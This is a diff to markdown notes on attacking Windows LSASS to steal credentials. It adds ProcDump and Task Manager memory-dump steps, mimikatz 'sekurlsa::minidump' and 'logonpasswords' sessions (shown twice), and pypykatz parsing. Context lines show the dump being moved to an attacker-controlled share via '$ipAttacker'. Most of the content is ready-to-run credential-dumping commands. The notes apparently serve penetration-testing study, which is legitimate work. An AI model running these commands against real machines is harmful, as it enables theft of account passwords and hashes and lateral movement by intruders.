@@ -26,7 +26,7 @@ The Task Manager method is dependent on us having a GUI-based interactive sessio
 
 A file called `lsass.DMP` is created and saved in:
 
-  Attacking LSASS
+Attacking LSASS
 
 ```cmd-session
 C:\Users\loggedonusersdirectory\AppData\Local\Temp
@@ -79,13 +79,59 @@ cmd.exe /c move C:\lsass.dmp
 move C:\lsass.dmp  \\$ipAttacker\CompData
 ```
 
+### ProcDump from Sysinternals
+
+We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory.
+
+Dumping the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process:
+
+```cmd-session
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+Exploiting it from the target host (if we can load tools such as mimikatz):
+
+```cmd-session
+mimikatz.exe
+
+# Using 'mimikatz.log' for logfile : OK
+mimikatz # log
+
+# Switch to MINIDUMP : 'lsass.dmp'
+mimikatz # sekurlsa::minidump lsass.dmp
+
+# Opening : 'lsass.dmp' file for minidump...
+mimikatz # sekurlsa::logonpasswords
+```
+
+Exploiting it without the capability of loading tools: take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`.  Download this file back to our attack machine.
 
 
-## Crack the lsass file withPypykatz
+## Crack the lsass file 
+
+### Pypykatz
 
 [pypykatz](pypykatz.md) parses the secrets hidden in the LSASS process memory dump.
 
 ```bash
 pypykatz lsa minidump /home/path/lsass.dmp 
+```
+
+
+### Mimikatz
+
+After dumping the lsaas we have procude a file lsass.dmp. We can analyze it with mimikatz:
+
+```cmd-session
+mimikatz.exe
+
+# Using 'mimikatz.log' for logfile : OK
+mimikatz # log
+
+# Switch to MINIDUMP : 'lsass.dmp'
+mimikatz # sekurlsa::minidump lsass.dmp
+
+# Opening : 'lsass.dmp' file for minidump...
+mimikatz # sekurlsa::logonpasswords
 ```
 
